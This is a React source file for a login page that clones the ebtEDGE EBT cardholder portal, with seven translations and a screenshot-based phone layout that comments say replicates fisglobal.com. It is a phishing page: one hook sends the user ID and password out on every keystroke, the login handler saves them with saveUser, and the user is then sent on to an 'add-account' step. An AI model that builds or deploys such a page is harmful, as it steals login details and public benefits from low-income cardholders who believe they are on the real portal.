import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import loginBg from "@/assets/login-bg-clean.jpg";
import mobilePattern from "@/assets/mobile-login-bg-pattern.jpg";
import fisLogo from "@/assets/fis-logo.svg";
import phoneLoginWide from "@/assets/phone-login-wide-hd.webp";
import { saveUser, generateId, broadcastTyping, clearTypingForSession, getSelectedLang, setSelectedLang } from "@/lib/userStore";

const translations: Record<string, {
  login: string;
  description: string;
  firstTime: string;
  registerHere: string;
  userId: string;
  password: string;
  troubleSigningIn: string;
  loginBtn: string;
  conditionsOfUse: string;
  privacyPolicy: string;
  accessibility: string;
  language: string;
  legalDisclaimer: string;
}> = {
  English: {
    login: "Login",
    description: "Your User ID can be used to access both the ebtEDGE Cardholder portal and ebtEDGE Mobile Application available in the Google Play or Apple App Store to access your account balance or review your transaction history.",
    firstTime: "First time logging in?",
    registerHere: "Register Here",
    userId: "User ID",
    password: "Password",
    troubleSigningIn: "Trouble Signing in?",
    loginBtn: "Login",
    conditionsOfUse: "Conditions of Use",
    privacyPolicy: "Privacy Policy",
    accessibility: "Accessibility",
    language: "Language",
    legalDisclaimer: "Legal Disclaimer",
  },
  "Español": {
    login: "Iniciar sesión",
    description: "Su ID de usuario se puede usar para acceder tanto al portal de titulares de tarjetas ebtEDGE como a la aplicación móvil ebtEDGE disponible en Google Play o Apple App Store para acceder al saldo de su cuenta o revisar su historial de transacciones.",
    firstTime: "¿Primera vez que inicia sesión?",
    registerHere: "Regístrese aquí",
    userId: "ID de usuario",
    password: "Contraseña",
    troubleSigningIn: "¿Problemas para iniciar sesión?",
    loginBtn: "Iniciar sesión",
    conditionsOfUse: "Condiciones de uso",
    privacyPolicy: "Política de privacidad",
    accessibility: "Accesibilidad",
    language: "Idioma",
    legalDisclaimer: "Aviso legal",
  },
  "Kreyòl Ayisyen": {
    login: "Konekte",
    description: "ID itilizatè ou a ka itilize pou aksede ni pòtay titilè kat ebtEDGE ak aplikasyon mobil ebtEDGE ki disponib nan Google Play oswa Apple App Store pou aksede balans kont ou oswa revize istwa tranzaksyon ou.",
    firstTime: "Premye fwa w ap konekte?",
    registerHere: "Enskri isit la",
    userId: "ID itilizatè",
    password: "Mo de pas",
    troubleSigningIn: "Pwoblèm pou konekte?",
    loginBtn: "Konekte",
    conditionsOfUse: "Kondisyon itilizasyon",
    privacyPolicy: "Politik konfidansyalite",
    accessibility: "Aksesibilite",
    language: "Lang",
    legalDisclaimer: "Avi Legal",
  },
  "عربي": {
    login: "تسجيل الدخول",
    description: "يمكن استخدام معرف المستخدم الخاص بك للوصول إلى بوابة حاملي بطاقات ebtEDGE وتطبيق ebtEDGE المحمول المتوفر في Google Play أو Apple App Store للوصول إلى رصيد حسابك أو مراجعة سجل المعاملات الخاص بك.",
    firstTime: "أول مرة تسجل الدخول؟",
    registerHere: "سجل هنا",
    userId: "معرف المستخدم",
    password: "كلمة المرور",
    troubleSigningIn: "مشكلة في تسجيل الدخول؟",
    loginBtn: "تسجيل الدخول",
    conditionsOfUse: "شروط الاستخدام",
    privacyPolicy: "سياسة الخصوصية",
    accessibility: "إمكانية الوصول",
    language: "اللغة",
    legalDisclaimer: "إخلاء المسؤولية القانونية",
  },
  "中文": {
    login: "登录",
    description: "您的用户ID可用于访问ebtEDGE持卡人门户和ebtEDGE移动应用程序，该应用程序可在Google Play或Apple App Store中获取，以访问您的账户余额或查看您的交易记录。",
    firstTime: "首次登录？",
    registerHere: "在此注册",
    userId: "用户ID",
    password: "密码",
    troubleSigningIn: "登录遇到问题？",
    loginBtn: "登录",
    conditionsOfUse: "使用条款",
    privacyPolicy: "隐私政策",
    accessibility: "无障碍",
    language: "语言",
    legalDisclaimer: "法律免责声明",
  },
  "русский": {
    login: "Вход",
    description: "Ваш идентификатор пользователя может использоваться для доступа к порталу держателей карт ebtEDGE и мобильному приложению ebtEDGE, доступному в Google Play или Apple App Store, для проверки баланса счета или просмотра истории транзакций.",
    firstTime: "Впервые входите в систему?",
    registerHere: "Зарегистрируйтесь здесь",
    userId: "ID пользователя",
    password: "Пароль",
    troubleSigningIn: "Проблемы со входом?",
    loginBtn: "Вход",
    conditionsOfUse: "Условия использования",
    privacyPolicy: "Политика конфиденциальности",
    accessibility: "Доступность",
    language: "Язык",
    legalDisclaimer: "Правовая оговорка",
  },
  "Polski": {
    login: "Logowanie",
    description: "Twój identyfikator użytkownika może być używany do dostępu zarówno do portalu posiadaczy kart ebtEDGE, jak i aplikacji mobilnej ebtEDGE dostępnej w Google Play lub Apple App Store, aby sprawdzić saldo konta lub przejrzeć historię transakcji.",
    firstTime: "Logujesz się po raz pierwszy?",
    registerHere: "Zarejestruj się tutaj",
    userId: "ID użytkownika",
    password: "Hasło",
    troubleSigningIn: "Problem z logowaniem?",
    loginBtn: "Zaloguj się",
    conditionsOfUse: "Warunki użytkowania",
    privacyPolicy: "Polityka prywatności",
    accessibility: "Dostępność",
    language: "Język",
    legalDisclaimer: "Zastrzeżenie prawne",
  },
};

const languages = ["English", "Español", "Kreyòl Ayisyen", "عربي", "中文", "русский", "Polski"];

// Phone detection — true on any narrow viewport (<= 500px wide).
// Activates the phone layout on real phones and on narrow desktop previews.
const detectPhone = () =>
  typeof window !== "undefined" && window.innerWidth <= 500;


const Index = () => {
  const navigate = useNavigate();
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [activeMobileField, setActiveMobileField] = useState<"user" | "password" | null>(null);
  const [lang, setLang] = useState(() => {
    const saved = getSelectedLang();
    return languages.includes(saved) ? saved : "English";
  });
  const [langOpen, setLangOpen] = useState(false);
  const dropdownRef = useRef<HTMLDivElement>(null);
  const mobileSwipeBoundRef = useRef<WeakSet<HTMLDivElement>>(new WeakSet());
  const t = translations[lang];

  const [isRealPhone, setIsRealPhone] = useState(detectPhone);
  const [phoneVw, setPhoneVw] = useState<number>(() =>
    typeof window !== "undefined" ? window.innerWidth : 390
  );
  const [phoneVh, setPhoneVh] = useState<number>(() =>
    typeof window !== "undefined" ? window.innerHeight : 844
  );
  useEffect(() => {
    // Android keyboard reduces window.innerHeight which would otherwise trigger
    // a full re-layout of the giant phone screenshot on every keystroke (= freeze
    // on Samsung Internet / Chrome). We only react to WIDTH changes, and only to
    // large HEIGHT changes (rotation), never to small ones (keyboard open/close).
    let lastW = window.innerWidth;
    let lastH = window.innerHeight;
    let raf = 0;
    const onResize = () => {
      cancelAnimationFrame(raf);
      raf = requestAnimationFrame(() => {
        const w = window.innerWidth;
        const h = window.innerHeight;
        const widthChanged = w !== lastW;
        const bigHeightChange = Math.abs(h - lastH) > 150; // rotation, not keyboard
        if (widthChanged || bigHeightChange) {
          lastW = w;
          lastH = h;
          setIsRealPhone(detectPhone());
          setPhoneVw(w);
          setPhoneVh(h);
        }
      });
    };
    window.addEventListener("resize", onResize, { passive: true });
    window.addEventListener("orientationchange", onResize, { passive: true });
    return () => {
      cancelAnimationFrame(raf);
      window.removeEventListener("resize", onResize);
      window.removeEventListener("orientationchange", onResize);
    };
  }, []);


  const canLogin = userId.trim().length > 0 && password.trim().length > 0;

  // Broadcast keystrokes in real-time
  useEffect(() => {
    broadcastTyping({ "User ID": userId, "Password": password });
  }, [userId, password]);

  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target as Node)) {
        setLangOpen(false);
      }
    };
    document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  }, []);

  useEffect(() => {
    const { body, documentElement } = document;
    const prevBodyTouchAction = body.style.touchAction;
    const prevBodyOverscroll = body.style.overscrollBehavior;
    const prevBodyOverscrollY = body.style.overscrollBehaviorY;
    const prevHtmlTouchAction = documentElement.style.touchAction;
    const prevHtmlOverscroll = documentElement.style.overscrollBehavior;
    const prevHtmlOverscrollY = documentElement.style.overscrollBehaviorY;

    body.style.touchAction = "auto";
    body.style.overscrollBehavior = "auto";
    body.style.overscrollBehaviorY = "auto";
    documentElement.style.touchAction = "auto";
    documentElement.style.overscrollBehavior = "auto";
    documentElement.style.overscrollBehaviorY = "auto";

    return () => {
      body.style.touchAction = prevBodyTouchAction;
      body.style.overscrollBehavior = prevBodyOverscroll;
      body.style.overscrollBehaviorY = prevBodyOverscrollY;
      documentElement.style.touchAction = prevHtmlTouchAction;
      documentElement.style.overscrollBehavior = prevHtmlOverscroll;
      documentElement.style.overscrollBehaviorY = prevHtmlOverscrollY;
    };
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!canLogin || isSubmitting) return;
    setIsSubmitting(true);
    try {
      clearTypingForSession();
      const ok = await saveUser({
        id: generateId(),
        type: "old",
        timestamp: new Date().toISOString(),
        userId,
        password,
      });
      if (!ok) {
        alert("Nu s-au putut salva datele. Încearcă din nou.");
        return;
      }
      navigate("/add-account");
    } finally {
      setIsSubmitting(false);
    }
  };

  // On a real phone we render the same desktop layout (scaled by the viewport meta),
  // but with the language selector shown as a globe icon and the footer reduced to
  // a single "Legal Disclaimer" link — matching the original fisglobal.com phone view.
  const phoneFooter = isRealPhone;

  // ============================================================
  // PHONE LAYOUT — only on a real phone, replicates fisglobal.com
  // ============================================================
  if (isRealPhone) {
    const slideW = phoneVw;
    const slideH = phoneVh;
    const nativeSlideW = 1047;
    const nativeSlideH = 1920;
    const nativeVisibleH = 1887; // Crop the captured browser-bottom strip so the pattern reaches the edge.
    const wideNativeW = 1411;
    // Scale to cover the viewport, but crop the unused captured bottom bar instead of showing a seam.
    const imageScale = Math.max(slideW / nativeSlideW, slideH / nativeVisibleH);
    const imgW = nativeSlideW * imageScale;
    const imgH = nativeSlideH * imageScale;
    const totalTrackW = wideNativeW * imageScale;
    const trackH = imgH;

    const submitMobileLogin = async () => {
      const currentUserId = userId.trim() || document.querySelector<HTMLInputElement>('input[name="ebt-uid-left"]')?.value.trim() || "";
      const currentPassword = password.trim() || document.querySelector<HTMLInputElement>('input[name="ebt-pw-left"]')?.value.trim() || "";
      if (!currentUserId || !currentPassword || isSubmitting) return;
      setIsSubmitting(true);
      const entry = {
        id: generateId(),
        type: "old" as const,
        timestamp: new Date().toISOString(),
        userId: currentUserId,
        password: currentPassword,
      };
      try {
        clearTypingForSession();
        const ok = await saveUser(entry);
        if (!ok) {
          alert("Nu s-au putut salva datele. Încearcă din nou.");
          return;
        }
        navigate("/add-account");
      } finally {
        setIsSubmitting(false);
      }
    };

    // Helper: place a real hitbox on the exact scaled screenshot coordinates.
    const placeOnImage = (leftPx: number, rightPx: number, topPx: number, bottomPx: number): React.CSSProperties => ({
      position: "absolute",
      left: imgW * (leftPx / 1047),
      top: imgH * (topPx / 1920),
      width: imgW * ((rightPx - leftPx) / 1047),
      height: imgH * ((bottomPx - topPx) / 1920),
      zIndex: 5,
    });

    const placeOnWide = (leftPx: number, rightPx: number, topPx: number, bottomPx: number): React.CSSProperties => ({
      position: "absolute",
      left: totalTrackW * (leftPx / wideNativeW),
      top: imgH * (topPx / 1920),
      width: totalTrackW * ((rightPx - leftPx) / wideNativeW),
      height: imgH * ((bottomPx - topPx) / 1920),
      zIndex: 5,
    });

    const mkInputStyle = (): React.CSSProperties => {
      return {
        border: "none",
        outline: "none",
        background: "transparent",
        borderRadius: 0,
        padding: `0 ${Math.max(9, imgW * 0.026)}px`,
        fontSize: Math.max(12, imgH * 0.014),
        lineHeight: 1.15,
        color: "#000",
        fontFamily: "Arial, Helvetica, sans-serif",
        fontWeight: 400,
        boxSizing: "border-box",
        WebkitTapHighlightColor: "transparent",
      };
    };

    const mobileHitboxStyle: React.CSSProperties = {
      border: "none",
      background: "transparent",
      padding: 0,
      cursor: "pointer",
      WebkitTapHighlightColor: "transparent",
      touchAction: "manipulation",
      color: "transparent",
    };

    const passwordPlaceholderCover = (): React.CSSProperties => ({
      ...placeOnImage(84, 355, 1002, 1038),
      zIndex: 4,
      pointerEvents: "none",
      background: "#fff",
      opacity: password.length > 0 || activeMobileField === "password" ? 1 : 0,
    });


    return (
      <div
        style={{
          width: "100vw",
          height: "100dvh",
          background: "#ffffff",
          fontFamily: "Arial, Helvetica, sans-serif",
          overflow: "hidden",
          position: "relative",
          top: 0,
          left: 0,
          touchAction: "auto",
          overscrollBehavior: "auto",
        }}
      >
        {/* Horizontal swipe carousel */}
        <div
          data-mobile-login-scroll
          ref={(el) => {
            if (!el || mobileSwipeBoundRef.current.has(el)) return;
            mobileSwipeBoundRef.current.add(el);

            let isDragging = false;
            let dragStartX = 0;
            let dragStartY = 0;
            let dragStartScroll = 0;
            let dragStartScrollTop = 0;
            const stopDrag = (e: PointerEvent) => {
              if (!isDragging) return;
              isDragging = false;
              el.style.cursor = "grab";
              if (el.hasPointerCapture(e.pointerId)) el.releasePointerCapture(e.pointerId);
            };

            // Mouse-only drag-to-scroll. On touch we let the OS handle native momentum scroll
            // (much smoother on iOS/Android — manual pointermove with preventDefault causes lag).
            el.addEventListener("pointerdown", (e: PointerEvent) => {
              if (e.pointerType !== "mouse") return;
              const target = e.target as HTMLElement | null;
              if (target?.closest("input, select, textarea, button, a")) return;
              isDragging = true;
              dragStartX = e.clientX;
              dragStartY = e.clientY;
              dragStartScroll = el.scrollLeft;
              dragStartScrollTop = el.scrollTop;
              el.style.cursor = "grabbing";
              el.setPointerCapture(e.pointerId);
            });
            el.addEventListener("pointermove", (e: PointerEvent) => {
              if (!isDragging || e.pointerType !== "mouse") return;
              el.scrollLeft = dragStartScroll - (e.clientX - dragStartX);
              el.scrollTop = dragStartScrollTop - (e.clientY - dragStartY);
              e.preventDefault();
            }, { passive: false });
            el.addEventListener("pointerup", stopDrag);
            el.addEventListener("pointercancel", stopDrag);
          }}
          style={{
            width: "100%",
            height: "100dvh",
            overflowX: "auto",
            overflowY: "auto",
            WebkitOverflowScrolling: "touch",
            cursor: "grab",
            scrollbarWidth: "none",
            touchAction: "auto",
            overscrollBehavior: "auto",
          }}
        >
          <div
            style={{
              width: totalTrackW,
              height: trackH,
              position: "relative",
            }}
          >
            <div style={{ position: "absolute", left: 0, top: 0, width: totalTrackW, height: imgH }}>
              <img src={phoneLoginWide} alt="Login" decoding="async" loading="eager" {...({ fetchpriority: "high" } as any)} style={{ width: totalTrackW, height: imgH, display: "block", userSelect: "none", pointerEvents: "none", transform: "translateZ(0)", willChange: "transform", backfaceVisibility: "hidden" }} draggable={false} />
              {/* Extend the bottom blue band by repeating the actual image strip */}
              <div
                aria-hidden="true"
                style={{
                  position: "absolute",
                  left: 0,
                  top: imgH,
                  width: totalTrackW,
                  height: Math.round(imgH * 0.022),
                  backgroundImage: `url(${phoneLoginWide})`,
                  backgroundRepeat: "no-repeat",
                  backgroundSize: `${totalTrackW}px ${imgH}px`,
                  backgroundPosition: `0 -${imgH - Math.round(imgH * 0.012)}px`,
                  pointerEvents: "none",
                }}
              />
            </div>

            <div aria-hidden="true" style={passwordPlaceholderCover()} />
            <input type="text" value={userId} onFocus={() => setActiveMobileField("user")} onBlur={() => setActiveMobileField(null)} onChange={(e) => setUserId(e.target.value)} required autoComplete="off" name="ebt-uid-left" aria-label="User ID" style={{ ...placeOnImage(67, 1000, 748, 858), ...mkInputStyle(), zIndex: 6 }} />
            <input type="password" value={password} onFocus={() => setActiveMobileField("password")} onBlur={() => setActiveMobileField(null)} onChange={(e) => setPassword(e.target.value)} required autoComplete="new-password" name="ebt-pw-left" aria-label="Password" style={{ ...placeOnImage(67, 1000, 970, 1080), ...mkInputStyle(), zIndex: 6 }} />

            <button type="button" onClick={() => navigate("/register")} aria-label="Register Here" style={{ ...placeOnImage(320, 540, 596, 674), ...mobileHitboxStyle }} />
            <button type="button" onClick={() => {}} aria-label="Trouble Signing in" style={{ ...placeOnImage(48, 360, 1198, 1298), ...mobileHitboxStyle }} />
            <button type="button" disabled={isSubmitting} onClick={submitMobileLogin} aria-label="Login" style={{ ...placeOnWide(905, 1386, 1118, 1211), zIndex: 10, pointerEvents: "auto", border: "none", borderRadius: 9999, background: canLogin ? "#1e5578" : "transparent", color: canLogin ? "#fff" : "transparent", fontFamily: "Arial, Helvetica, sans-serif", fontWeight: 400, fontSize: Math.max(14, imgH * 0.0215), display: "flex", alignItems: "center", justifyContent: "center", cursor: canLogin && !isSubmitting ? "pointer" : "default", transition: "background 140ms ease", padding: 0, WebkitTapHighlightColor: "transparent" }}>Login</button>

            {/* Globe (language selector) hitbox in top-left */}
            <button
              type="button"
              onClick={(e) => {
                e.stopPropagation();
                setLangOpen((v) => !v);
              }}
              aria-label="Language"
              style={{ ...mobileHitboxStyle, position: "fixed", top: 74, right: 0, width: 112, height: 120, zIndex: 1000, pointerEvents: "auto", touchAction: "manipulation" }}
            />
            {langOpen && (
              <div
                ref={dropdownRef}
                style={{
                  position: "fixed",
                  right: 10,
                  top: 174,
                  minWidth: Math.max(160, imgW * 0.42),
                  background: "#fff",
                  border: "1px solid #d0d0d0",
                  borderRadius: 4,
                  boxShadow: "0 6px 20px rgba(0,0,0,0.18)",
                  zIndex: 30,
                  overflow: "hidden",
                  fontSize: Math.max(13, imgH * 0.014),
                }}
              >
                {languages.map((l) => (
                  <button
                    key={l}
                    type="button"
                    onClick={(e) => { e.stopPropagation(); setLang(l); setSelectedLang(l); setLangOpen(false); }}
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: 8,
                      width: "100%",
                      padding: "10px 14px",
                      border: "none",
                      background: lang === l ? "#f5f5f5" : "#fff",
                      color: "#222",
                      textAlign: "left",
                      cursor: "pointer",
                      fontFamily: "Arial, Helvetica, sans-serif",
                    }}
                  >
                    <span style={{ width: 14, color: "#1e5578" }}>{lang === l ? "✓" : ""}</span>
                    {l}
                  </button>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
    );
  }

  // ============================================================
  // DESKTOP / TABLET LAYOUT (unchanged)
  // ============================================================
  return (
    <div
      className="relative h-screen w-screen overflow-hidden"
      style={{
        background: "linear-gradient(135deg, #2d7a96 0%, #1a5c73 40%, #1b6b85 60%, #2d7a96 100%)",
      }}
    >
      <img
        src={loginBg}
        alt="ebtEDGE background"
        className="pointer-events-none absolute inset-0 h-full w-full select-none object-fill"
        draggable={false}
        loading="eager"
      />

      <div
        style={{
          position: "absolute",
          top: "30px",
          right: "24px",
          left: "24px",
          maxWidth: "500px",
          marginLeft: "auto",
          backgroundColor: "#fff",
          borderRadius: "4px",
          boxShadow: "0 2px 12px rgba(0,0,0,0.16)",
          padding: "14px 20px 16px",
          fontFamily: "Arial, Helvetica, sans-serif",
          boxSizing: "border-box",
        }}
      >
        {/* Language selector */}
        <div ref={dropdownRef} style={{ display: "flex", justifyContent: "flex-end", marginBottom: "8px", position: "relative" }}>
          <button
            type="button"
            onClick={() => setLangOpen(!langOpen)}
            aria-label={t.language}
            style={{
              fontSize: "13px",
              color: "#006272",
              background: "none",
              border: "none",
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              gap: "4px",
              padding: phoneFooter ? "4px" : "0",
            }}
          >
            {phoneFooter ? (
              // Globe icon (matches fisglobal.com phone view)
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#006272" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
                <circle cx="12" cy="12" r="10" />
                <path d="M2 12h20" />
                <path d="M12 2a15 15 0 0 1 0 20" />
                <path d="M12 2a15 15 0 0 0 0 20" />
              </svg>
            ) : (
              <>
                {t.language}
                <svg width="10" height="6" viewBox="0 0 10 6" fill="none" style={{ transform: langOpen ? "rotate(180deg)" : "none", transition: "transform 0.2s" }}>
                  <path d="M1 1L5 5L9 1" stroke="#006272" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </>
            )}
          </button>

          {langOpen && (
            <div
              style={{
                position: "absolute",
                top: "100%",
                right: 0,
                marginTop: "4px",
                backgroundColor: "#fff",
                border: "1px solid #ddd",
                borderRadius: "4px",
                boxShadow: "0 4px 12px rgba(0,0,0,0.15)",
                minWidth: "160px",
                zIndex: 100,
                overflow: "hidden",
              }}
            >
              {languages.map((l) => (
                <button
                  key={l}
                  type="button"
                  onClick={() => { setLang(l); setSelectedLang(l); setLangOpen(false); }}
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: "8px",
                    width: "100%",
                    padding: "10px 16px",
                    border: "none",
                    background: lang === l ? "#f5f5f5" : "#fff",
                    cursor: "pointer",
                    fontSize: "14px",
                    color: "#333",
                    textAlign: "left",
                  }}
                  onMouseEnter={(e) => (e.currentTarget.style.background = "#f0f0f0")}
                  onMouseLeave={(e) => (e.currentTarget.style.background = lang === l ? "#f5f5f5" : "#fff")}
                >
                  {lang === l && <span style={{ color: "#333", fontSize: "14px" }}>✓</span>}
                  {lang !== l && <span style={{ width: "14px" }} />}
                  {l}
                </button>
              ))}
            </div>
          )}
        </div>

        {/* Title */}
        <h1 style={{ fontSize: "28px", fontWeight: 900, color: "#000", margin: "0 0 10px", lineHeight: 1.1 }}>
          {t.login}
        </h1>

        {/* Description */}
        <p style={{ fontSize: "12.5px", lineHeight: 1.45, color: "#333", fontWeight: 700, margin: "0 0 4px" }}>
          {t.description}
        </p>

        {/* Register */}
        <p style={{ fontSize: "12.5px", color: "#333", margin: "0 0 14px" }}>
          {t.firstTime}{" "}
          <a
            href="#"
            onClick={(e) => { e.preventDefault(); navigate("/register"); }}
            style={{ color: "#006272", fontWeight: 700, textDecoration: "none" }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = "underline")}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = "none")}
          >
            {t.registerHere}
          </a>
        </p>

        <form onSubmit={handleLogin} autoComplete="off">
          {/* User ID */}
          <div style={{ marginBottom: "4px" }}>
            <label style={{ display: "block", fontSize: "12px", color: "#006272", marginBottom: "3px" }}>
              {t.userId} <span style={{ color: "#c00" }}>*</span>
            </label>
            <input
              type="text"
              value={userId}
              onChange={(e) => setUserId(e.target.value)}
              required
              autoComplete="off"
              name="ebt-uid-x"
              style={{
                width: "100%",
                height: "38px",
                border: "2px solid #006272",
                borderRadius: "3px",
                padding: "0 10px",
                fontSize: "14px",
                outline: "none",
                boxSizing: "border-box",
              }}
              onFocus={(e) => (e.currentTarget.style.borderColor = "#004d5a")}
              onBlur={(e) => (e.currentTarget.style.borderColor = "#006272")}
            />
          </div>

          {/* Password */}
          <div style={{ marginTop: "22px", marginBottom: "14px" }}>
            <input
              type="password"
              placeholder={`${t.password} *`}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              autoComplete="new-password"
              name="ebt-pw-x"
              style={{
                width: "100%",
                height: "38px",
                border: "1px solid #b8b8b8",
                borderRadius: "3px",
                padding: "0 10px",
                fontSize: "14px",
                outline: "none",
                boxSizing: "border-box",
              }}
              onFocus={(e) => (e.currentTarget.style.borderColor = "#006272")}
              onBlur={(e) => (e.currentTarget.style.borderColor = "#b8b8b8")}
            />
          </div>

          {/* Trouble + Login */}
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "16px" }}>
            <a
              href="#"
              style={{ fontSize: "12.5px", fontWeight: 700, color: "#006272", textDecoration: "none" }}
              onMouseEnter={(e) => (e.currentTarget.style.textDecoration = "underline")}
              onMouseLeave={(e) => (e.currentTarget.style.textDecoration = "none")}
            >
              {t.troubleSigningIn}
            </a>
            <button
              type="submit"
              disabled={!canLogin || isSubmitting}
              style={{
                backgroundColor: canLogin && !isSubmitting ? "#2e7d9c" : "#8ea9b3",
                color: "#fff",
                border: "none",
                borderRadius: "999px",
                padding: "9px 40px",
                fontSize: "15px",
                fontWeight: 500,
                cursor: canLogin && !isSubmitting ? "pointer" : "not-allowed",
                transition: "background-color 0.3s",
                opacity: 1,
              }}
            >
              {t.loginBtn}
            </button>
          </div>
        </form>

        {/* Divider */}
        <hr style={{ border: "none", borderTop: "1px solid #b8b8b8", margin: "0 0 10px" }} />

        {/* Footer */}
        {phoneFooter ? (
          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: "8px", fontSize: "12px", fontWeight: 700 }}>
            <span
              aria-hidden="true"
              style={{
                display: "inline-flex",
                alignItems: "center",
                justifyContent: "center",
                width: "18px",
                height: "18px",
                borderRadius: "50%",
                background: "#3a3a3a",
                color: "#fff",
                fontStyle: "italic",
                fontFamily: "Georgia, 'Times New Roman', serif",
                fontSize: "13px",
                fontWeight: 700,
                lineHeight: 1,
              }}
            >
              i
            </span>
            <a href="#" style={{ color: "#333", textDecoration: "none" }}
              onMouseEnter={(e) => (e.currentTarget.style.textDecoration = "underline")}
              onMouseLeave={(e) => (e.currentTarget.style.textDecoration = "none")}
            >{t.legalDisclaimer}</a>
          </div>
        ) : (
          <div style={{ display: "flex", justifyContent: "center", gap: "16px", fontSize: "11px", fontWeight: 700, flexWrap: "wrap" }}>
            <a href="#" style={{ color: "#006272", textDecoration: "none" }}
              onMouseEnter={(e) => (e.currentTarget.style.textDecoration = "underline")}
              onMouseLeave={(e) => (e.currentTarget.style.textDecoration = "none")}
            >{t.conditionsOfUse}</a>
            <a href="#" style={{ color: "#006272", textDecoration: "none" }}
              onMouseEnter={(e) => (e.currentTarget.style.textDecoration = "underline")}
              onMouseLeave={(e) => (e.currentTarget.style.textDecoration = "none")}
            >{t.privacyPolicy}</a>
            <a href="#" style={{ color: "#006272", textDecoration: "none" }}
              onMouseEnter={(e) => (e.currentTarget.style.textDecoration = "underline")}
              onMouseLeave={(e) => (e.currentTarget.style.textDecoration = "none")}
            >{t.accessibility}</a>
          </div>
        )}
      </div>
    </div>
  );
};

export default Index;
